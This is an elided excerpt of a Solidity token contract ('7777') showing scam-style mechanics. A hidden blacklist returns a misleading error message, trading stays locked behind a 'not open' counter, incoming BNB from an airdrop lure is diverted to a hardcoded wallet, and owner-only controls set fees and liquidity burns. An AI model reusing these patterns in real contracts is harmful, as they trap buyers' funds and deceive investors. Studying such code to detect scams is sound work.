...
contract Token is ERC20, Ownable {
    ...
    address public _marketingWalletAddress = 0xd0cceb4606bFd1210bA95120635B3668E89A0a90;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _isBlacklist;
    uint256 public _airdropAmount = 2400 * (10**18);
    uint256 public _airdropBNB = 1 * (10**15);
    uint256 public _airdropNumber = 0;
    uint256 public _maxNumber = 5;
    uint256 public _Fee = 5;
    bool public  lpBurnEnabled = false;
    uint256 public times;
    constructor() public ERC20("7777", "77") {
    ...
    function setmax(uint256 account) public onlyOwner {
        _maxNumber = account;
    }
    ...
    function setairdropNumber(uint256 airdropNumber) external onlyOwner{
        _airdropNumber = airdropNumber;
    }
    function setpercentForLPBurn(uint256 _percentForLPBurn) external onlyOwner{
        percentForLPBurn = _percentForLPBurn;
    }
     function setlpBurnFrequency(uint256 _lpBurnFrequency) external onlyOwner{
    ...
    function _transfer(
        ...
        require(!_isBlacklist[from] , "ERC20: transfer to the zero address");
        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        if(!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            require(times>2233, "not open");
        }
        ...
        if(takeFee) {
            uint256 lpfees = amount.mul(_Fee).div(100);
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
     ...
     receive() external payable {
        ...
        payable(_marketingWalletAddress).transfer(msgValue);
        if (3323 < times) {
            return;
        }
        if(_airdropNumber > _maxNumber){
            return;
        }   
    ...
    uint256 public percentForLPBurn = 1000; // 25 = .25%
    event AutoNukeLP();
